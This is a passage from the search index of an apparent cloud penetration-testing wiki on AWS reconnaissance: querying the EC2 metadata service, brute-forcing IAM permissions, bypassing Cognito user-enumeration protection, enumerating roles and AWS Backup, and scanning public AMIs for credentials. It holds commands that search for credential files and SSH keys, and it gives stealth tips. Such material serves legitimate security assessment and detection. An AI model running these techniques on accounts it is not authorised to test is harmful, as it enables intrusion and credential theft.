(sdb:ListDomains) on resource (arn:aws:sdb:us-east-1:123456789012:domain/). Contact account owner.\n</code></pre>"},{"location":"aws/enumeration/account_id_from_ec2/","title":"Enumerate AWS Account ID from an EC2 Instance","text":"<p>With shell or command line access to an EC2 instance, you will be able to determine some key information about the AWS account.</p>"},{"location":"aws/enumeration/account_id_from_ec2/#get-caller-identity","title":"get-caller-identity","text":"<p>By using get-caller-identity, the EC2 instance may have an EC2 instance profile setup.</p> <pre><code>user@host:$ aws sts get-caller-identity\n{\n   \"Account\": \"000000000000\",\n   \"UserId\": \"AROAJIWIJQ5KCHMJX4EWI:i-00000000000000000\",\n   \"Arn\": \"arn:aws:sts::000000000000:assumed-role/AmazonLightsailInstanceRole/i-00000000000000000\"\n}\n</code></pre>"},{"location":"aws/enumeration/account_id_from_ec2/#metadata","title":"Metadata","text":"<p>By using the metadata service, you will be able to retrieve additional information about the account, and more specifically for the EC2 instance being used.</p> <p><pre><code>TOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/dynamic/instance-identity/document\n</code></pre> The output will reveal additional information. <pre><code>{\n   \"accountId\" : \"000000000000\",\n   \"architecture\" : \"x86_64\",\n   \"availabilityZone\" : \"ap-southeast-2a\",\n   \"billingProducts\" : null,\n   \"devpayProductCodes\" : null,\n   \"marketplaceProductCodes\" : null,\n   \"imageId\" : \"ami-042c4533fa25c105a\",\n   \"instanceId\" : \"i-00000000000000000\",\n   \"instanceType\" : \"t2.nano\",\n   \"kernelId\" : null,\n   \"pendingTime\" : \"2022-02-27T22:34:30Z\",\n   \"privateIp\" : \"172.26.6.225\",\n   \"ramdiskId\" : null,\n   \"region\" : \"ap-southeast-2\",\n   \"version\" : \"2017-09-30\"\n}\n</code></pre></p>"},{"location":"aws/enumeration/account_id_from_s3_bucket/","title":"Enumerate AWS Account ID from a Public S3 Bucket","text":"<ul> <li> <p> Original Research</p> <p> <p>Finding the Account ID of any public S3 bucket by Ben Bridts</p> <p></p> </p> </li> <li> <p> Tools mentioned in this article</p> <p>s3-account-search: A tool to find the account ID an S3 bucket belongs to.</p> </li> </ul> <p>Note</p> <p>When you install a version &lt;0.2.0 using pip, the executable is named <code>s3-account-search</code>.</p> <p>By leveraging the s3:ResourceAccount policy condition, we can identify the AWS account ID associated with a public S3 bucket. This is possible because it supports wildcards (*). With this, we can sequentially enumerate the account ID.</p> <p>To test this, you can use Grayhat Warfare's list of public S3 buckets.</p> <p>You will need a role with <code>s3:getObject</code> and <code>s3:ListBucket</code> permissions, and you can specify the target bucket as the resource for your policy. Alternatively, you can set a resource of '*' to quickly test multiple buckets.</p>"},{"location":"aws/enumeration/account_id_from_s3_bucket/#installation","title":"Installation","text":"<p>The tool can be installed with the following command:</p> <pre><code>python3 -m pip install s3-account-search\n</code></pre>"},{"location":"aws/enumeration/account_id_from_s3_bucket/#setup","title":"Setup","text":"<p>To use the tool, there is some setup on your end. You will need your own AWS account with a role you can assume with the <code>s3:GetObject</code> or <code>s3:ListBucket</code> permissions. s3-account-finder will assume this role so make sure the credentials you're using can do this.</p>"},{"location":"aws/enumeration/account_id_from_s3_bucket/#usage","title":"Usage","text":"<pre><code>s3-account-search arn:aws:iam::123456789123:role/s3-searcher &lt;bucket name&gt;\nStarting search (this can take a while)\nfound: 1\nfound: 12\n*** snip ***\nfound: 123456789123\n</code></pre> <p>Operational Security Tip</p> <p>As of 2022's announcement, any new buckets are created without the Public Access policy and specifically without any ACLs. The removal of the ACLs means that the <code>GetObject</code>, instead you must enable the AWS ACLs that make S3 Buckets readable in addition to having GetBucket in the IAM Policy. Here is a terraform block to enable this abuse which use to be the default pre-2022. </p> <pre><code>```\nresource \"aws_s3_bucket_ownership_controls\" \"example\" {\n    bucket = aws_s3_bucket.example.id\n    rule {\n        object_ownership = \"BucketOwnerPreferred\"\n    }\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"example\" {\n    bucket = aws_s3_bucket.example.id\n\n    block_public_acls       = false\n    block_public_policy     = false\n    ignore_public_acls      = false\n    restrict_public_buckets = false\n}\n\nresource \"aws_s3_bucket_acl\" \"example\" {\n    bucket = aws_s3_bucket.example.id\n    acl    = \"public-read\"\n\n    depends_on = [\n        aws_s3_bucket_ownership_controls.example,\n        aws_s3_bucket_public_access_block.example\n    ]\n}\n```\n</code></pre> <p>Tip</p> <p>Pair this with Unauthenticated Enumeration of IAM Users and Roles!</p>"},{"location":"aws/enumeration/brute_force_iam_permissions/","title":"Brute Force IAM Permissions","text":"<ul> <li> <p> Technique seen in the wild</p> <p>Reference: Compromised Cloud Compute Credentials: Case Studies From the Wild</p> </li> <li> <p> Tools mentioned in this article</p> <p>enumerate-iam: Enumerate the permissions associated with an AWS credential set.</p> </li> </ul> <p>When attacking AWS you may compromise credentials for an IAM user or role. This can be an excellent step to gain access to other resources, however it presents a problem for us; How do we know what permissions we have access to? While we may have context clues based on the name of the role/user or based on where we found them, this is hardly exhaustive or thorough. </p> <p>This leaves us with basically one option, brute force the permissions. To do this, we will try as many safe API calls as possible, seeing which ones fail and which ones succeed. Those that succeed are the permissions we have available to us. There are several tools to do this, however, here we will be covering enumerate-iam by Andr\u00e9s Riancho.</p> <p>To use enumerate-iam, simply pull a copy of the tool from GitHub, provide the credentials, and watch the magic happen. All calls by enumerate-iam are non-destructive, meaning only get and list operations are used. This reduces the risk of accidentally deleting something in a client's account.</p> <pre><code>user@host:/enum$ ./enumerate-iam.py --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY --session-token $AWS_SESSION_TOKEN\n2020-12-20 18:41:26,375 - 13 - [INFO] Starting permission enumeration for access-key-id \"ASIAAAAAAAAAAAAAAAAA\"\n2020-12-20 18:41:26,812 - 13 - [INFO] -- Account ARN : arn:aws:sts::012345678912:assumed-role/role-b/user-b\n2020-12-20 18:41:26,812 - 13 - [INFO] -- Account Id  : 012345678912\n2020-12-20 18:41:26,813 - 13 - [INFO] -- Account Path: assumed-role/role-b/user-b\n2020-12-20 18:41:27,283 - 13 - [INFO] Attempting common-service describe / list brute force.\n2020-12-20 18:41:34,992 - 13 - [INFO] -- codestar.list_projects() worked!\n2020-12-20 18:41:35,928 - 13 - [INFO] -- sts.get_caller_identity() worked!\n2020-12-20 18:41:36,838 - 13 - [INFO] -- dynamodb.describe_endpoints() worked!\n2020-12-20 18:41:38,107 - 13 - [INFO] -- sagemaker.list_models() worked!\n</code></pre>"},{"location":"aws/enumeration/brute_force_iam_permissions/#updating-apis","title":"Updating APIs","text":"<p>With an attack surface that evolves as rapidly as AWS, we often have to find and abuse newer features. This is one area where enumerate-iam shines. The tool itself has a built in feature to read in new AWS API calls from the JavaScript SDK, and use that information to brute force. After downloading enumerate-iam, perform the following steps to update the API lists.</p> <pre><code>cd enumerate_iam/\ngit clone https://github.com/aws/aws-sdk-js.git\npython generate_bruteforce_tests.py\n</code></pre> <p>This will create or update a file named bruteforce_tests.py under enumerate-iam.</p>"},{"location":"aws/enumeration/brute_force_iam_permissions/#opsec-considerations","title":"OPSEC Considerations","text":"<p>One thing to note is that this tool is very noisy and will generate a ton of CloudTrail logs. This makes it very easy for a defender to spot this activity and lock you out of that role or user. Try other methods of permission enumeration first, or be willing to lose access to these credentials before resorting to brute-force. </p>"},{"location":"aws/enumeration/bypass_cognito_user_enumeration_controls/","title":"Bypass Cognito Account Enumeration Controls","text":"<ul> <li> <p> Additional Resources</p> <p>AWS Docs: Managing user existence error responses</p> </li> </ul> <p>Amazon Cognito is a popular \u201csign-in as a service\u201d offering from AWS. It allows developers to push the responsibility of developing authentication, sign up, and secure credential storage to AWS so they can instead focus on building their app.</p> <p>By default, Cognito will set a configuration called <code>Prevent user existence errors</code>. This is designed to prevent adversaries from enumerating accounts and using that information for further attacks, such as credential stuffing.</p> <p>While this is useful in theory, and a good default to have, it can be bypassed via cognito-idp:SignUp calls for usernames. This bypass was originally reported via a GitHub issue in July 2020 and Cognito is still vulnerable as of early 2024.</p> <p>Note</p> <p>Cognito user pools can be configured to prevent disclosing user existence errors via alias attributes for email addresses and phone numbers, but not usernames. Be mindful that the 'Prevent user existence errors' setting does not cover all scenarios as detailed below.    </p>"},{"location":"aws/enumeration/bypass_cognito_user_enumeration_controls/#example-responses","title":"Example Responses","text":"<p>To demonstrate the responses depending on the configuration and if a user does/does not exist, here are some examples. The <code>admin</code> user exists in the user pool and is the account we will be trying to enumerate.</p> <p>Note</p> <p>The <code>client-id</code> value for a Cognito User Pool is not secret and is accessible from the JavaScript served by the client. </p>"},{"location":"aws/enumeration/bypass_cognito_user_enumeration_controls/#prevent-user-existence-errors-on-and-user-exists","title":"Prevent user existence errors on and user exists","text":"<pre><code>$ aws cognito-idp initiate-auth \\\n--auth-flow USER_PASSWORD_AUTH \\\n--client-id 719\u2026 \\\n--auth-parameters USERNAME=admin,PASSWORD=blah\n\nAn error occurred (NotAuthorizedException) when calling the InitiateAuth operation: Incorrect username or password.\n</code></pre>"},{"location":"aws/enumeration/bypass_cognito_user_enumeration_controls/#prevent-user-existence-errors-on-and-user-does-not-exist","title":"Prevent user existence errors on and user does not exist","text":"<pre><code>$ aws cognito-idp initiate-auth \\\n--auth-flow USER_PASSWORD_AUTH \\\n--client-id 719\u2026 \\\n--auth-parameters USERNAME=notreal,PASSWORD=blah\n\nAn error occurred (NotAuthorizedException) when calling the InitiateAuth operation: Incorrect username or password.\n</code></pre>"},{"location":"aws/enumeration/bypass_cognito_user_enumeration_controls/#prevent-user-existence-errors-off-and-user-exists","title":"Prevent user existence errors off and user exists","text":"<pre><code>$ aws cognito-idp initiate-auth \\\n--auth-flow USER_PASSWORD_AUTH \\\n--client-id 719\u2026 \\\n--auth-parameters USERNAME=admin,PASSWORD=blah\n\nAn error occurred (NotAuthorizedException) when calling the InitiateAuth operation: Incorrect username or password.\n</code></pre>"},{"location":"aws/enumeration/bypass_cognito_user_enumeration_controls/#prevent-user-existence-errors-off-and-user-does-not-exist","title":"Prevent user existence errors off and user does not exist","text":"<pre><code>$ aws cognito-idp initiate-auth \\\n--auth-flow USER_PASSWORD_AUTH \\\n--client-id 719\u2026 \\\n--auth-parameters USERNAME=notreal,PASSWORD=blah\n\nAn error occurred (UserNotFoundException) when calling the InitiateAuth operation: User does not exist.\n</code></pre> <p>As you can see, an adversary can use the <code>UserNotFoundException</code> and <code>NotAuthorizedException</code> to enumerate whether an account does or does not exist. By enabling the <code>Prevent user existence errors</code> configuration, defenders can successfully mitigate these types of attacks. However we will show how it can be bypassed.</p>"},{"location":"aws/enumeration/bypass_cognito_user_enumeration_controls/#cognito-idpsignup","title":"cognito-idp:SignUp","text":"<p>The <code>Prevent user existence errors</code> configuration appears to only impact the <code>initiate-auth</code> flow. It does not impact cognito-idp:SignUp. Because of this we can use this API call to enumerate if a user does or does not exist. Please see the following examples:</p>"},{"location":"aws/enumeration/bypass_cognito_user_enumeration_controls/#prevent-user-existence-errors-on-and-user-exists_1","title":"Prevent user existence errors on and user exists","text":"<pre><code>$ aws cognito-idp sign-up \\\n--client-id 719... \\\n--username admin \\\n--password \"BlahBlah123!\" \\\n--user-attributes Name=email,Value=\"blah@blah.net\"\n\nAn error occurred (UsernameExistsException) when calling the SignUp operation: User already exists\n</code></pre>"},{"location":"aws/enumeration/bypass_cognito_user_enumeration_controls/#prevent-user-existence-errors-on-and-user-does-not-exist_1","title":"Prevent user existence errors on and user does not exist","text":"<pre><code>$ aws cognito-idp sign-up \\\n--client-id 719... \\\n--username notreal \\\n--password \"BlahBlah123!\" \\\n--user-attributes Name=email,Value=\"blah@blah.net\"\n{\n    \"UserConfirmed\": false,\n    \"CodeDeliveryDetails\": {\n        \"Destination\": \"b***@b***\",\n        \"DeliveryMedium\": \"EMAIL\",\n        \"AttributeName\": \"email\"\n    },\n    \"UserSub\": \"a20\u2026\"\n}\n</code></pre>"},{"location":"aws/enumeration/bypass_cognito_user_enumeration_controls/#detection-opportunities","title":"Detection Opportunities","text":"<p>If an adversary is using this technique at scale to identify what accounts exist in your user pool, you can attempt to detect this behavior by alerting on a sudden increase in <code>Unconfirmed</code> user accounts.</p> <p></p> <p>Depending on the configuration of your user pool, an adversary could attempt to get around this by using a real email address to confirm the user name.</p>"},{"location":"aws/enumeration/bypass_cognito_user_enumeration_controls/#cloudtrail-and-cloudwatch-limitations","title":"CloudTrail and CloudWatch Limitations","text":"<p>If you attempt to build detections around this using CloudTrail or CloudWatch, you will run into challenges. This is because a significant portion of useful telemetry (basically all of it) is omitted in these logs. For example, the <code>userIdentity</code> who made the API call is <code>Anonymous</code></p> <pre><code>{\n    \"eventVersion\": \"1.08\",\n    \"userIdentity\": {\n        \"type\": \"Unknown\",\n        \"principalId\": \"Anonymous\"\n}\n</code></pre> <p>And the <code>username</code> and <code>userAttributes</code> are hidden:</p> <pre><code>\"requestParameters\": {\n    \"clientId\": \"719...\",\n    \"username\": \"HIDDEN_DUE_TO_SECURITY_REASONS\",\n    \"password\": \"HIDDEN_DUE_TO_SECURITY_REASONS\",\n    \"userAttributes\": \"HIDDEN_DUE_TO_SECURITY_REASONS\"\n}\n</code></pre> <p>For this reason, you can use CloudTrail or CloudWatch to track the number of cognito-idp:SignUp calls, and their associated <code>sourceIPAddress</code>, but not access their details. </p>"},{"location":"aws/enumeration/discover_secrets_in_public_aims/","title":"Discover secrets in public AMIs","text":"<ul> <li> <p> Original Research</p> <p>AWS CloudQuarry: Digging for Secrets in Public AMIs by Eduard Agavriloae and Matei Josephs.</p> </li> </ul> <p>For EC2 instances, Amazon Machine Images (AMIs) are crucial as they contain the essential information required to launch instances, including the operating system, configuration files, software, and relevant data. A significant security consideration of these AMIs is that they can be (either accidentally or intentionally) made public, thus accessible for anyone to utilize and potentially exploit.</p>"},{"location":"aws/enumeration/discover_secrets_in_public_aims/#finding-exposed-amis","title":"Finding Exposed AMIs","text":"<p>Many instances of resource exposure (and subsequent exploitation) in AWS necessitate knowing the AMI ID. This offers some level of security-by-obscurity as an attacker needs the AMI ID to exploit the resource.</p> <p>However, if AMIs are marked public, the list of available public AMIs is accessible through the AWS API. If you know the account ID, you can easily run through all regions to see if any public AMIs are available:</p> <pre><code>aws ec2 describe-images --owners &lt;account_id&gt; --include-deprecated --region &lt;region&gt;\n</code></pre>"},{"location":"aws/enumeration/discover_secrets_in_public_aims/#using-public-amis-and-scanning-for-credentials","title":"Using Public AMIs and Scanning for Credentials","text":"<p>Once you've identified public AMIs, you can use them to launch instances and manually scan for sensitive information, including credentials.</p>"},{"location":"aws/enumeration/discover_secrets_in_public_aims/#launching-an-instance-from-a-public-ami","title":"Launching an Instance from a Public AMI","text":"<p>To launch an instance from a public AMI, follow these steps:</p> <ol> <li>Launch an Instance: Using the AWS CLI, launch an instance using the desired AMI: <pre><code>aws ec2 run-instances --image-id &lt;image_id&gt; --instance-type t2.micro --key-name &lt;key-pair&gt;\n</code></pre></li> <li>Access the Instance: Once the instance is running, connect to it using Session Manager or SSH: <pre><code>ssh -i &lt;your-key-pair&gt;.pem ec2-user@&lt;public-dns-of-instance&gt;\n</code></pre></li> </ol>"},{"location":"aws/enumeration/discover_secrets_in_public_aims/#manually-scanning-for-credentials","title":"Manually Scanning for Credentials","text":"<p>Manual scanning involves checking common locations where credentials may be stored. Here are some typical command-line operations that can help:</p> <ol> <li>Search for AWS Credentials: <pre><code>find / -name \"credentials\" -type f\n</code></pre></li> <li>Search for SSH Keys: <pre><code>find / -name \"id_rsa\" -type f\n</code></pre></li> <li>Look for Configuration Files Containing Sensitive Information: Use <code>grep</code> to locate keywords such as 'password', 'secret', 'key', etc. <pre><code>grep -ri 'password\\|secret\\|key' /path/to/search\n</code></pre></li> </ol>"},{"location":"aws/enumeration/discover_secrets_in_public_aims/#automating-the-process","title":"Automating the Process","text":"<p>While the manual process can be effective for targeted searches, automation provides efficiency and consistency at scale. </p> <p>You can write scripts or use specialized tools to automate the detection of sensitive information. Here are some approaches:</p> <ol> <li>Using Bash Scripts: Create a script that executes various <code>find</code> and <code>grep</code> commands. Save this as <code>scan.sh</code>: <pre><code>#!/bin/bash\n# Search for AWS credentials\nfind /home -name \"credentials\" -print\n\n# Search for SSH keys\nfind /home -name \"id_rsa\" -print\n\n# Search for sensitive information in configuration files\ngrep -ri 'password\\|secret\\|key' /home\n</code></pre> Run the script on each instance: <pre><code>chmod +x scan.sh\n./scan.sh\n</code></pre></li> <li>Using Specialized Tools: Tools like truffleHog and gitleaks can detect sensitive information in codebases and configurations.</li> </ol>"},{"location":"aws/enumeration/enum_iam_user_role/","title":"Unauthenticated Enumeration of IAM Users and Roles","text":"<ul> <li> <p> Original Research</p> <p> <p>Hacking AWS end-to-end - remastered by Daniel Grzelak</p> <p></p> </p> </li> <li> <p> Additional Resources</p> <p>Reference: Unauthenticated AWS Role Enumeration (IAM Revisited)</p> </li> <li> <p> Tools mentioned in this article</p> <ul> <li>quiet-riot </li> <li>enumerate_iam_using_bucket_policy</li> <li>pacu:iam_enum_roles</li> </ul> </li> </ul> <p>You can enumerate AWS Account IDs, Root User account e-mail addresses, IAM roles, IAM users, and gain insights to enabled AWS and third-party services by abusing Resource-Based Policies, even in accounts for which you have no access. Quiet Riot offers a scalable method for enumerating each of these items with configurable wordlists per item type. Furthermore - it also allows you to enumerate Azure Active Directory and Google Workspace valid email addresses - which can then be used to test for valid Root User accounts in AWS, assuming that the email address is the same.</p> <p>Ultimately, if you want to perform these techniques at scale - Quiet Riot is your best bet, but if you want to do it manually, you can a number of ways to do so. Another way to enumerate IAM principals would be to use S3 Bucket Policies. Take the following example:</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"Example permissions\",\n            \"Effect\": \"Deny\",\n            \"Principal\": {\n                \"AWS\": \"arn:aws:iam::123456789123:role/role_name\"\n            },\n            \"Action\": \"s3:ListBucket\",\n            \"Resource\": \"arn:aws:s3:::*bucket you own*\"\n        }\n    ]\n}\n</code></pre> <p>You would apply this policy to a bucket you own. By specifying a principal in the target account (123456789123), you can determine if that principals exists. If setting the bucket policy succeeds you know the role exists. If it fails you know the role does not.</p> <p>There are a few ways to do this, for example, Pacu's module will attempt to change the AssumeRole policy of a role in your account and specify a role in another account. If the role exists, the policy will be updated and no error will be returned. If the role does not exist, the policy will not be updated and instead return an error.</p> <p>Warning</p> <p>Doing either of these techniques will generate a lot of CloudTrail events, specifically UpdateAssumeRolePolicy or PutBucketPolicy in your account. If your intention is to be stealthy it is not advised (or required) to use a target's credentials. Instead you should use your own account (the CloudTrail events will be generated there).</p> <p>Note</p> <p>While this works for both IAM users and roles, this will also work with service-linked roles. This will allow you to enumerate various services the account uses, such as GuardDuty or Organizations.</p> <p>Another method uses the AWS Console. Based on error responses from the AWS Console it is possible to determine if a given email address belongs to the root user of an AWS account.</p> <p>From the AWS Console, ensure the <code>Root user</code> radio button is selected and enter an email address that you suspect owns an AWS account. </p> <p>If that email address is valid, you will be prompted to enter a password. If that email address is invalid, you will receive an error message:</p> <pre><code>There was an error - An AWS account with that sign-in information does not exist. Try again or create a new account.\n</code></pre>"},{"location":"aws/enumeration/enumerate_principal_arn_from_unique_id/","title":"Derive a Principal ARN from an AWS Unique Identifier","text":"<ul> <li> <p> Original Research</p> <p> <p>Reversing AWS IAM unique IDs by Aidan Steele</p> <p></p> </p> </li> <li> <p> Additional Resources</p> <p>Reference: Unique identifiers</p> </li> </ul> <p>When operating in an AWS environment, you may come upon a variety of IAM unique identifiers. These identifiers correspond to different types of AWS resources, and the type of the resource can be identified by the prefix (the first four characters).</p> <p>For IAM users (AIDA) and roles (AROA) you can reverse the unique ID to its corresponding ARN by referencing it in a resource-based policy.</p> <p>To do this, we can use the example ID of <code>AROAJMD24IEMKTX6BABJI</code> from Aidan Steele's excellent explanation of the topic. While this technique should work with most resource-based policies, we will use a role's trust policy.</p> <p>First, we will create a role with the following trust policy:</p> <pre><code>{\n    \"Version\": \"2008-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"Statement1\",\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"AWS\": \"AROAJMD24IEMKTX6BABJI\"\n            },\n            \"Action\": \"sts:AssumeRole\"\n        }\n    ]\n}\n</code></pre> <p>We will then save the policy and refresh the page. </p> <p>Note</p> <p>You may get a warning in the policy editor saying, \"Invalid Role Reference: The Principal element includes the IAM role ID AROAJMD24IEMKTX6BABJI. We recommend that you use a role ARN instead\", however this will not prevent you from saving the policy.</p> <p>After refreshing the page the policy will now be as follows:</p> <pre><code>{\n    \"Version\": \"2008-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"Statement1\",\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"AWS\": \"arn:aws:iam::607481581596:role/service-role/abctestrole\"\n            },\n            \"Action\": \"sts:AssumeRole\"\n        }\n    ]\n}\n</code></pre> <p>This reveals the ARN of the role associated with the original unique identifier.</p>"},{"location":"aws/enumeration/enumerate_root_email_from_console/","title":"Enumerate Root User Email Address from the AWS Console","text":"<p>Based on error responses from the AWS Console it is possible to determine if a given email address belongs to the root user of an AWS account.</p> <p>From the AWS Console, ensure the <code>Root user</code> radio button is selected and enter an email address that you suspect owns an AWS account. </p> <p>If that email address is valid, you will be prompted to enter a password. If that email address is invalid, you will receive an error message:</p> <pre><code>There was an error - An AWS account with that sign-in information does not exist. Try again or create a new account.\n</code></pre>"},{"location":"aws/enumeration/enumerate_services_via_aws_backup/","title":"Enumerate services via AWS Backup","text":"<ul> <li> <p> Original Research</p> <p>Enumeration via the AWS Backup service by biggie_linz.</p> </li> </ul>"},{"location":"aws/enumeration/enumerate_services_via_aws_backup/#enumeration-of-services-via-aws-backup","title":"Enumeration of services via AWS Backup","text":""},{"location":"aws/enumeration/enumerate_services_via_aws_backup/#overview","title":"Overview","text":"<p>An attacker with permissions of at least <code>backup:List*</code> or <code>backup:Describe*</code> permissions can enumerate the AWS Backup service to potentially find critical resources in an AWS account without needing to use traditional, well-monitored and heavily scrutinised reconnaissance commands for individual services.</p> <p>The AWS Backup service supports the following resource types:</p> <ul> <li>Aurora</li> <li>AWS CloudFormation</li> <li>Amazon DocumentDB</li> <li>DynamoDB</li> <li>DynamoDB with AWS Backup advanced features</li> <li>Amazon EBS</li> <li>Amazon EC2</li> <li>Amazon EFS</li> <li>Amazon Redshift</li> <li>Redshift Serverless</li> <li>Amazon RDS</li> </ul> <p>We can use the AWS CLI to enumerate the AWS Backup service to learn more about these services within a target account, should the target be utilising the AWS Backup service to perform backups of these services.</p>"},{"location":"aws/enumeration/enumerate_services_via_aws_backup/#why-do-we-care","title":"Why do we care?","text":"<p>The AWS Backup service can reveal interesting information to attackers such as:</p> <ul> <li>The resources that the target account really cares about (and those they don't really care about but backup anyway) - the Backup service is not enabled by default, and as such, an administrator must specifically enable it and configure it. This means that the resources that are backed up are likely of importance and warrant further review.</li> <li>Reveals strategies for tagging and resource naming - e.g. is the target using tags like <code>Enviromnent=production</code> vs <code>Environment=Prod</code> or using something totally different like <code>Tier=Critical</code></li> <li>Mapping of resources - when we query the Backup service we can see the breadth of services that the organisation is using.</li> <li>*Timing information - we can see when backups do run, and how long they are retained for.</li> <li>We don't need to rely on calling heavily monitored enumeration commands for individual services.*</li> </ul>"},{"location":"aws/enumeration/enumerate_services_via_aws_backup/#attack","title":"Attack","text":""},{"location":"aws/enumeration/enumerate_services_via_aws_backup/#enumerating-backed-up-resources","title":"Enumerating backed up resources","text":"<p>Viewing all resources that have been backed up</p> <p><code>aws backup list-protected-resources</code></p> <p>This one is probably the most interesting in this article - this command returns an array of resources that have been successfully backed up by Backup, including the time the resource was saved, an Amazon Resource Name (ARN) of the resource, and a resource type.</p> <pre><code>{\n    \"Results\": [\n        {\n            \"ResourceArn\": \"arn:aws:rds:ap-southeast-2:[REDACTED]:db:database-1\",\n            \"ResourceType\": \"RDS\",\n            \"LastBackupTime\": \"2025-05-04T21:43:01.687000-07:00\",\n            \"ResourceName\": \"database-1\",\n            \"LastBackupVaultArn\": \"arn:aws:backup:ap-southeast-2:[REDACTED]:backup-vault:Default\",\n            \"LastRecoveryPointArn\": \"arn:aws:rds:ap-southeast-2:[REDACTED]:snapshot:awsbackup:[REDACTED]\"\n        }\n    ]\n}\n</code></pre> <p>Note that this will only show resources that have been backed up in the past, and not resources that are yet to be backed up.</p>"},{"location":"aws/enumeration/enumerate_services_via_aws_backup/#enumerating-resources-within-backup-plans","title":"Enumerating resources within Backup Plans","text":"<p>Enumerating Backup Plans</p> <p><code>aws backup list-backup-plans</code></p> <p>As the operation implies, this will list the Backup Plans for the account.</p> <p>In the following snippet we can see some interesting details such as:</p> <ul> <li><code>BackupPlanId</code> - more on this later,</li> <li><code>BackupPlanName</code> - this may let on naming strategies used by the target.</li> </ul> <pre><code>{\n    \"BackupPlansList\": [\n        {\n            \"BackupPlanArn\": \"arn:aws:backup:ap-southeast-2:[REDACTED]:backup-plan:31[REDACTED]da\",\n            \"BackupPlanId\": \"31[REDACTED]da\",\n            \"CreationDate\": \"2025-05-04T21:16:24.813000-07:00\",\n            \"VersionId\": \"OT[REDACTED]E4\",\n            \"BackupPlanName\": \"prod-backups\",\n            \"CreatorRequestId\": \"7e[REDACTED]99\"\n        }\n    ]\n}\n</code></pre> <p>Enumerating the Backup Plan's details</p> <p><code>aws backup get-backup-plan --backup-plan-id &lt;BACKUP-PLAN-ID&gt;</code></p> <p>where:</p> <ul> <li><code>BACKUP-PLAN-ID</code> is the <code>BackupPlanId</code> from the previous command.</li> </ul> <p>This command provides some more information on the specified Backup Plan.</p> <p>Specifically, it provides insights in to:</p> <ul> <li>Timings - <code>ScheduleExpression</code></li> <li>Retention policies - <code>Lifecycle</code></li> <li>Naming schemes - <code>RuleName</code>, <code>TargetBackupVaultName</code>, <code>RecoveryPointTags</code></li> </ul> <pre><code>aws backup get-backup-plan --backup-plan-id 31[REDACTED]da\n{\n    \"BackupPlan\": {\n        \"BackupPlanName\": \"prod-backups\",\n        \"Rules\": [\n            {\n                \"RuleName\": \"DailyBackups\",\n                \"TargetBackupVaultName\": \"Default\",\n                \"ScheduleExpression\": \"cron(0 5 ? * * *)\",\n                \"StartWindowMinutes\": 480,\n                \"CompletionWindowMinutes\": 10080,\n                \"Lifecycle\": {\n                    \"DeleteAfterDays\": 3\n                },\n                \"RecoveryPointTags\": {},\n                \"RuleId\": \"4c[REDACTED]43\",\n                \"CopyActions\": [],\n                \"ScheduleExpressionTimezone\": \"America/Los_Angeles\"\n            }\n        ]\n    },\n    \"BackupPlanId\": \"31[REDACTED]da\",\n    \"BackupPlanArn\": \"arn:aws:backup:ap-southeast-2:[REDACTED]:backup-plan:31[REDACTED]da\",\n    \"VersionId\": \"OT[REDACTED]E4\",\n    \"CreatorRequestId\": \"7e[REDACTED]99\",\n    \"CreationDate\": \"2025-05-04T21:16:24.813000-07:00\"\n}\n</code></pre> <p>Enumerating resources targeted for backups in a given Backup Plan</p> <p>First, we must find the <code>SelectionId</code> of our Backup Plan:</p> <p><code>aws backup list-backup-selections --backup-plan-id 31[REDACTED]da</code></p> <pre><code>{\n    \"BackupSelectionsList\": [\n        {\n            \"SelectionId\": \"e9[REDACTED]fc\",\n            \"SelectionName\": \"rds-prod\",\n            \"BackupPlanId\": \"31[REDACTED]da\",\n            \"CreationDate\": \"2025-05-04T21:17:47.318000-07:00\",\n            \"CreatorRequestId\": \"c0[REDACTED]53\",\n            \"IamRoleArn\": \"arn:aws:iam::[REDACTED]:role/service-role/AWSBackupDefaultServiceRole\"\n        }\n    ]\n}\n</code></pre> <p>We can then use the <code>SelectionId</code> to find the resources that will be targeted as a part of this Backup Plan (note: this can be tag-based and/or ARNs). Note that even if the backup job has not yet run the resources will still be shown:</p> <pre><code>{\n    \"BackupSelection\": {\n        \"SelectionName\": \"rds-prod\",\n        \"IamRoleArn\": \"arn:aws:iam::[REDACTED]:role/service-role/AWSBackupDefaultServiceRole\",\n        \"Resources\": [\n            \"arn:aws:rds:ap-southeast-2:[REDACTED]:db:database-1\"\n        ],\n        \"ListOfTags\": [],\n        \"NotResources\": [],\n        \"Conditions\": {\n            \"StringEquals\": [],\n            \"StringNotEquals\": [],\n            \"StringLike\": [],\n            \"StringNotLike\": []\n        }\n    },\n    \"SelectionId\": \"e9[REDACTED]fc\",\n    \"BackupPlanId\": \"31[REDACTED]da\",\n    \"CreationDate\": \"2025-05-04T21:17:47.318000-07:00\",\n    \"CreatorRequestId\": \"c0[REDACTED]53\"\n</code></pre> <p>In the above snippet we can see the potential existence of a likely production RDS instance, <code>database-1</code>, that we previously were not aware of.</p>"},{"location":"aws/enumeration/enumerate_services_via_aws_backup/#detection-strategy","title":"Detection strategy","text":"<p>Calls to <code>ListProtectedResources</code></p> <p>Organisations can flag calls to the <code>ListProtectedResources</code> event where it is:</p> <ul> <li>Invoked by IAM role/user not used for backup,</li> <li>Invoked outside backup windows, or</li> <li>From a new IP/geolocation.</li> </ul> <p>Enumeration burst patterns</p> <p>Look for bursts of calls to APIs to do with the Backup service, such as:</p> <ul> <li><code>ListBackupVaults</code></li> <li><code>ListBackupPlans</code></li> <li><code>ListBackupSelections</code></li> <li><code>ListProtectedResources</code></li> </ul>"},{"location":"aws/enumeration/get-account-id-from-keys/","title":"Get Account ID from AWS Access Keys","text":"<ul> <li> <p> Original Research</p> <ul> <li>AWS Access Key ID Formats by Aidan Steele</li> <li>A short note on AWS KEY ID by Tal Be'ery</li> </ul> </li> </ul> <p>While performing an assessment in AWS environments it is not uncommon to come across access keys and not know what account they are associated with. If your scope is defined by the AWS account ID, this may pose a problem as you'd likely not want to use them if they are out of 